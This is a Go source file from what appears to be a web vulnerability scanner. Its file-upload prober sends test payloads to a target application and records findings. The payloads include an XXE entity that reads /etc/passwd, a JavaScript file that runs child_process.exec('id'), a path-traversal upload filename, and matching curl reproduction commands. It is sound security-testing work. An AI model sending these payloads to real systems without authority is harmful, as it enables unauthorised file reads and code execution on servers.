package probers

import (
	"bytes"
	"context"
	"fmt"
	"mime/multipart"
	"strings"

	"github.com/borntobeyours/ouroboros/pkg/types"
)

// FileUploadProber tests for file upload vulnerabilities.
type FileUploadProber struct{}

func (p *FileUploadProber) Name() string { return "fileupload" }

func (p *FileUploadProber) Probe(ctx context.Context, target types.Target, endpoints []types.Endpoint) []types.Finding {
	cfg := NewProberConfig(target)
	var findings []types.Finding

	findings = append(findings, p.testFileUploadEndpoint(cfg)...)
	findings = append(findings, p.testProfileImageUpload(cfg)...)
	findings = append(findings, p.testComplaintFileUpload(cfg)...)
	findings = append(findings, p.testUploadDirectoryListing(cfg)...)

	return findings
}

func (p *FileUploadProber) testFileUploadEndpoint(cfg *ProberConfig) []types.Finding {
	var findings []types.Finding

	// Test unrestricted file upload
	var buf bytes.Buffer
	writer := multipart.NewWriter(&buf)

	// Try uploading a malicious file
	part, err := writer.CreateFormFile("file", "test.xml")
	if err != nil {
		return findings
	}
	part.Write([]byte(`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>`))
	writer.Close()

	status, _, respBody, err := cfg.DoRequest("POST", cfg.BaseURL+"/file-upload",
		&buf, map[string]string{"Content-Type": writer.FormDataContentType()})
	if err != nil {
		return findings
	}

	if status == 200 || status == 204 {
		findings = append(findings, MakeFinding(
			"Unrestricted File Upload - XML with XXE",
			"High",
			"The file upload endpoint accepts XML files that could contain XXE payloads, enabling server-side file reading.",
			"/file-upload",
			"POST",
			"CWE-434",
			fmt.Sprintf(`curl -X POST %s/file-upload -F "file=@malicious.xml"`, cfg.BaseURL),
			fmt.Sprintf("HTTP %d - File accepted: %s", status, truncate(respBody, 200)),
			"file_upload",
			0,
		))
	}

	// Try uploading executable content
	var buf2 bytes.Buffer
	writer2 := multipart.NewWriter(&buf2)
	part2, _ := writer2.CreateFormFile("file", "shell.js")
	part2.Write([]byte(`require('child_process').exec('id')`))
	writer2.Close()

	s2, _, rb2, e2 := cfg.DoRequest("POST", cfg.BaseURL+"/file-upload",
		&buf2, map[string]string{"Content-Type": writer2.FormDataContentType()})
	if e2 == nil && (s2 == 200 || s2 == 204) {
		findings = append(findings, MakeFinding(
			"Unrestricted File Upload - JavaScript/Executable",
			"High",
			"The file upload endpoint accepts JavaScript files, potentially enabling server-side code execution.",
			"/file-upload",
			"POST",
			"CWE-434",
			fmt.Sprintf(`curl -X POST %s/file-upload -F "file=@shell.js"`, cfg.BaseURL),
			fmt.Sprintf("HTTP %d - JS file accepted: %s", s2, truncate(rb2, 200)),
			"file_upload",
			0,
		))
	}

	return findings
}

func (p *FileUploadProber) testProfileImageUpload(cfg *ProberConfig) []types.Finding {
	var findings []types.Finding

	if cfg.AuthToken == "" {
		return findings
	}

	// Test file upload via profile image
	var buf bytes.Buffer
	writer := multipart.NewWriter(&buf)
	part, err := writer.CreateFormFile("file", "../../etc/test.jpg")
	if err != nil {
		return findings
	}
	part.Write([]byte("fake image content"))
	writer.Close()

	status, _, respBody, err := cfg.DoRequest("POST", cfg.BaseURL+"/profile/image/file",
		&buf, map[string]string{"Content-Type": writer.FormDataContentType()})
	if err != nil {
		return findings
	}

	if status == 200 || status == 204 {
		findings = append(findings, MakeFinding(
			"Path Traversal in File Upload - Profile Image",
			"High",
			"The profile image upload endpoint does not sanitize file names, allowing path traversal via directory traversal sequences.",
			"/profile/image/file",
			"POST",
			"CWE-22",
			fmt.Sprintf(`curl -X POST %s/profile/image/file -F "file=@test.jpg;filename=../../etc/test.jpg" -H "Authorization: %s"`, cfg.BaseURL, cfg.AuthToken),
			fmt.Sprintf("HTTP %d - File uploaded: %s", status, truncate(respBody, 200)),
			"file_upload",
			0,
		))
	}

	return findings
}

func (p *FileUploadProber) testComplaintFileUpload(cfg *ProberConfig) []types.Finding {
	var findings []types.Finding

	if cfg.AuthToken == "" {
		return findings
	}

	var buf bytes.Buffer
	writer := multipart.NewWriter(&buf)

	writer.WriteField("message", "test complaint")

	part, err := writer.CreateFormFile("file", "test.pdf")
	if err != nil {
		return findings
	}
	part.Write([]byte("%PDF-1.4 fake pdf content"))
	writer.Close()

	status, _, respBody, err := cfg.DoRequest("POST", cfg.BaseURL+"/api/Complaints",
		&buf, map[string]string{"Content-Type": writer.FormDataContentType()})
	if err != nil {
		return findings
	}

	if status == 200 || status == 201 {
		findings = append(findings, MakeFinding(
			"File Upload via Complaints API",
			"Medium",
			"The complaints endpoint accepts file uploads that may not be properly validated.",
			"/api/Complaints",
			"POST",
			"CWE-434",
			fmt.Sprintf(`curl -X POST %s/api/Complaints -F "message=test" -F "file=@test.pdf" -H "Authorization: %s"`, cfg.BaseURL, cfg.AuthToken),
			fmt.Sprintf("HTTP %d - Complaint with file: %s", status, truncate(respBody, 200)),
			"file_upload",
			0,
		))
	}

	return findings
}

func (p *FileUploadProber) testUploadDirectoryListing(cfg *ProberConfig) []types.Finding {
	var findings []types.Finding

	url := cfg.BaseURL + "/assets/public/images/uploads/"
	status, _, respBody, err := cfg.DoRequest("GET", url, nil, nil)
	if err == nil && status == 200 && (strings.Contains(respBody, "href") || strings.Contains(respBody, "img")) {
		findings = append(findings, MakeFinding(
			"Directory Listing - Upload Directory Exposed",
			"Medium",
			"The uploads directory is publicly browsable, exposing all uploaded files.",
			"/assets/public/images/uploads/",
			"GET",
			"CWE-548",
			fmt.Sprintf(`curl %s`, url),
			fmt.Sprintf("HTTP %d - Directory listing: %s", status, truncate(respBody, 200)),
			"info_leak",
			0,
		))
	}

	return findings
}
